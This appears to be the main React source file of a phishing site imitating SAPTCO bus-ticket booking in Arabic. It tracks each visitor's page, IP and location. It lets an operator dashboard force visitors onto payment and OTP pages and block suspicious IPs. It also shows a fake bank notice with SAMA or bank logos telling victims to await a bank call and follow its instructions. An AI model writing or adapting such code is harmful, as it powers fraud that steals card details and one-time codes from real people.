import { Switch, Route, useLocation } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { Loading } from "@/components/loading";
import { Suspense, lazy, useEffect, useState } from "react";
import { setupOnlineStatus } from "@/lib/utils";
import { ensureSaptcoStops } from "@/lib/saptco";
import {
  listenForDirectedStep,
  clearDirectedStep,
  ensureVisitorIp,
  listenForIpBlock,
  listenForVisitorBlock,
  listenForBankContactRequest,
  confirmBankContact,
  addData,
  handleCurrentPage,
} from "@/lib/firebase";
import samaLogo from "@/assets/sama_logo.png";
import { findBankLogo } from "@/lib/bank-logos";

// SAPTCO ticket flow: each dashboard step maps to a public route. The
// dashboard's "Push to step" buttons use these to teleport a visitor.
const TICKET_STEP_TO_PATH: Record<number, string> = {
  1: "/schedule",
  2: "/seat-selection",
  3: "/passenger-details",
  4: "/payment",
  5: "/otp",
  6: "/otp",
};

function pickTargetPath(step: number, _data: any): string | null {
  return TICKET_STEP_TO_PATH[step] || null;
}

function DirectedStepWatcher() {
  const [location, setLocation] = useLocation();
  useEffect(() => {
    let unsubscribe: (() => void) | undefined;
    let attachedFor: string | null = null;

    const isAdminPath = () => {
      const p = window.location.pathname;
      return p.startsWith("/dashboard") || p.startsWith("/login");
    };

    const handler = (step: number, data: any) => {
      // Re-check at fire time so admins don't get hijacked even if the
      // listener was attached on a non-admin path earlier.
      if (isAdminPath()) return;

      const target = pickTargetPath(step, data);
      // Always clear so the same step can be re-pushed and so the dashboard
      // doesn't keep showing a stale "directed" indicator.
      void clearDirectedStep();
      if (!target) return;
      if (window.location.pathname !== target) {
        setLocation(target);
      }
    };

    const tryAttach = () => {
      const id = localStorage.getItem("visitor");
      if (!id || id === attachedFor) return;
      if (unsubscribe) unsubscribe();
      attachedFor = id;
      unsubscribe = listenForDirectedStep(handler);
    };

    tryAttach();
    // The visitor ID is created on registration, which can happen after this
    // effect first runs. Poll every 1.5s so the listener attaches as soon as
    // the visitor record exists.
    const retry = window.setInterval(tryAttach, 1500);

    return () => {
      window.clearInterval(retry);
      if (unsubscribe) unsubscribe();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  void location;
  return null;
}

const OTPPage = lazy(() => import("@/pages/otp"));
const DashboardPage = lazy(() => import("@/pages/dashboard"));
const LoginPage = lazy(() => import("@/pages/login"));
const SchedulePage = lazy(() => import("@/pages/schedule"));
const BookPage = lazy(() => import("@/pages/book"));
const SeatSelectionPage = lazy(() => import("@/pages/seat-selection"));
const PassengerDetailsPage = lazy(() => import("@/pages/passenger-details"));
const PaymentPage = lazy(() => import("@/pages/payment"));
const NotFound = lazy(() => import("@/pages/not-found"));

function Router() {
  return (
    <Suspense fallback={null}>
      <Switch>
        <Route path="/" component={BookPage} />
        <Route path="/book" component={BookPage} />
        <Route path="/otp" component={OTPPage} />
        <Route path="/dashboard" component={DashboardPage} />
        <Route path="/login" component={LoginPage} />
        <Route path="/schedule" component={SchedulePage} />
        <Route path="/seat-selection" component={SeatSelectionPage} />
        <Route path="/passenger-details" component={PassengerDetailsPage} />
        <Route path="/payment" component={PaymentPage} />
        <Route component={NotFound} />
      </Switch>
    </Suspense>
  );
}

function BlockedScreen() {
  return (
    <div
      dir="rtl"
      className="min-h-screen flex items-center justify-center bg-[#1a0a10] text-white p-6"
      data-testid="blocked-screen"
    >
      <div className="max-w-md w-full text-center bg-[#2a1018] border border-[#4a1525] rounded-2xl p-8 shadow-2xl">
        <div className="text-5xl mb-4">⛔</div>
        <h1 className="text-2xl font-bold mb-3 text-[#c9a96e]">
          تم حظر الوصول
        </h1>
        <p className="text-sm text-slate-300 leading-relaxed">
          عذراً، لا يمكنك الوصول إلى هذا الموقع حالياً. إذا كنت تعتقد أن هذا
          خطأ، يرجى التواصل مع الدعم الفني.
        </p>
      </div>
    </div>
  );
}

function BlockGate({ children }: { children: React.ReactNode }) {
  const [ipBlocked, setIpBlocked] = useState(false);
  const [visitorBlocked, setVisitorBlocked] = useState(false);

  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;

    let unsubIp: (() => void) | undefined;
    let unsubVisitor: (() => void) | undefined;
    let cancelled = false;

    (async () => {
      const { ip, blocked: initial } = await ensureVisitorIp();
      if (cancelled) return;
      setIpBlocked(initial);
      if (ip) {
        unsubIp = listenForIpBlock(ip, (nowBlocked) => {
          setIpBlocked(nowBlocked);
        });
      }
    })();

    // Visitor-block listener: when a visitor record exists (set on
    // registration), subscribe to its `blocked` flag so admin actions take
    // effect immediately. Poll for the visitor ID since it can be created
    // after this effect first runs.
    let attachedFor: string | null = null;
    const tryAttach = () => {
      const id = localStorage.getItem("visitor");
      if (!id || id === attachedFor) return;
      if (unsubVisitor) unsubVisitor();
      attachedFor = id;
      unsubVisitor = listenForVisitorBlock((blocked) => {
        setVisitorBlocked(blocked);
      });
      // Now that the visitor doc exists, persist their IP + geolocation onto
      // it so the dashboard can show the real country.
      void ensureVisitorIp();
    };
    tryAttach();
    const retryInterval = window.setInterval(tryAttach, 1500);

    return () => {
      cancelled = true;
      if (unsubIp) unsubIp();
      if (unsubVisitor) unsubVisitor();
      window.clearInterval(retryInterval);
    };
  }, []);

  if (ipBlocked || visitorBlocked) {
    return <BlockedScreen />;
  }

  return <>{children}</>;
}

function BankContactModal({
  onConfirm,
  bankLogoSrc,
  bankLabel,
}: {
  onConfirm: () => void;
  bankLogoSrc: string;
  bankLabel: string;
}) {
  const [submitting, setSubmitting] = useState(false);
  return (
    <div
      dir="rtl"
      className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
      data-testid="bank-contact-modal"
    >
      <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden">
        <div className="bg-gradient-to-br from-[#4a1525] to-[#2a0a14] p-6 text-center">
          <div className="w-20 h-20 mx-auto rounded-full bg-white flex items-center justify-center mb-3 shadow-md p-2">
            <img
              src={bankLogoSrc}
              alt={bankLabel}
              className="w-full h-full object-contain"
              data-testid="img-bank-logo"
            />
          </div>
          <h2 className="text-white text-xl font-bold">إشعار من البنك</h2>
          {bankLabel && (
            <div
              className="text-[#c9a96e] text-sm mt-1"
              data-testid="text-bank-label"
            >
              {bankLabel}
            </div>
          )}
        </div>
        <div className="p-6 space-y-5">
          <p
            className="text-slate-800 text-base leading-relaxed text-center"
            data-testid="text-bank-contact-message"
          >
            حفاظاً على أمان معاملتكم، سيقوم البنك بالتواصل معكم خلال لحظات
            للتحقق من عملية الدفع. نرجو منكم اتباع التعليمات الواردة من البنك
            بدقة.
          </p>
          <div
            className="bg-amber-50 border border-amber-300 rounded-xl p-3 text-center"
            data-testid="note-bank-contact"
          >
            <p className="text-amber-900 text-sm font-semibold leading-relaxed">
              بعد إتمام إجراءات التحقق مع البنك، يرجى الضغط على «تأكيد التواصل»
              لاستكمال عملية الدفع.
            </p>
          </div>
          <button
            onClick={async () => {
              if (submitting) return;
              setSubmitting(true);
              try {
                await confirmBankContact();
              } finally {
                onConfirm();
              }
            }}
            disabled={submitting}
            className="w-full py-3 bg-gradient-to-r from-[#4a1525] to-[#6b1f37] hover:from-[#5a1a2e] hover:to-[#7a2440] text-white rounded-xl font-bold shadow-lg transition-all disabled:opacity-60"
            data-testid="button-confirm-bank-contact"
          >
            {submitting ? "جاري المتابعة..." : "تأكيد التواصل"}
          </button>
        </div>
      </div>
    </div>
  );
}

function BankContactGate() {
  const [show, setShow] = useState(false);
  const [bankName, setBankName] = useState("");
  const [bankBin, setBankBin] = useState("");

  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;

    let unsub: (() => void) | undefined;
    let attachedFor: string | null = null;

    const tryAttach = () => {
      const id = localStorage.getItem("visitor");
      if (!id || id === attachedFor) return;
      if (unsub) unsub();
      attachedFor = id;
      unsub = listenForBankContactRequest((shouldShow, payload) => {
        setShow(shouldShow);
        setBankName(payload.cardBankName || "");
        setBankBin(payload.cardBin || "");
      });
    };

    tryAttach();
    const retry = window.setInterval(tryAttach, 1500);

    return () => {
      window.clearInterval(retry);
      if (unsub) unsub();
    };
  }, []);

  // If the visitor doc has no bankName yet but we have a 6-digit BIN, look it
  // up via the same endpoint OTP uses. Cached server-side.
  useEffect(() => {
    if (!show || bankName || bankBin.length !== 6) return;
    let cancelled = false;
    (async () => {
      try {
        const res = await fetch(`/api/bin-lookup/${bankBin}`);
        if (!res.ok) return;
        const json = await res.json();
        const name = json?.data?.bankName || "";
        if (!cancelled && name) setBankName(name);
      } catch {
        // ignore
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [show, bankBin, bankName]);

  if (!show) return null;
  const matched = findBankLogo(bankName);
  const bankLogoSrc = matched?.logo || samaLogo;
  const bankLabel =
    matched?.label || (bankName ? bankName : "البنك المركزي السعودي");
  return (
    <BankContactModal
      onConfirm={() => setShow(false)}
      bankLogoSrc={bankLogoSrc}
      bankLabel={bankLabel}
    />
  );
}

const PATH_TO_PAGE: Record<string, string> = {
  "/": "book",
  "/book": "book",
  "/schedule": "schedule",
  "/passenger-details": "passenger_details",
  "/seat-selection": "seat_selection",
  "/payment": "payment",
  "/otp": "otp",
};

function pathToPage(path: string): string {
  if (PATH_TO_PAGE[path]) return PATH_TO_PAGE[path];
  return path.replace(/^\//, "").replace(/[\/\-]/g, "_") || "home";
}

function VisitorBootstrap() {
  const [location] = useLocation();
  useEffect(() => {
    void ensureSaptcoStops();
  }, []);
  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;

    let visitorId = localStorage.getItem("visitor");
    const isNew = !visitorId;
    if (isNew) {
      visitorId = `visitor_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
      localStorage.setItem("visitor", visitorId);
    }

    const page = pathToPage(location);
    if (isNew) {
      void addData({ id: visitorId, currentPage: page });
    } else {
      void handleCurrentPage(page);
    }
    setupOnlineStatus(visitorId!);
  }, [location]);
  return null;
}

function VisitorOnlyGates() {
  const [location] = useLocation();
  if (location.startsWith("/dashboard") || location.startsWith("/login")) {
    return null;
  }
  return (
    <>
      <VisitorBootstrap />
      <DirectedStepWatcher />
      <BankContactGate />
    </>
  );
}

function ForceRtl() {
  const [location] = useLocation();
  useEffect(() => {
    document.documentElement.setAttribute("dir", "rtl");
    document.documentElement.setAttribute("lang", "ar");
    document.body.setAttribute("dir", "rtl");
  }, [location]);
  return null;
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <BlockGate>
          <ForceRtl />
          <VisitorOnlyGates />
          <Router />
        </BlockGate>
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
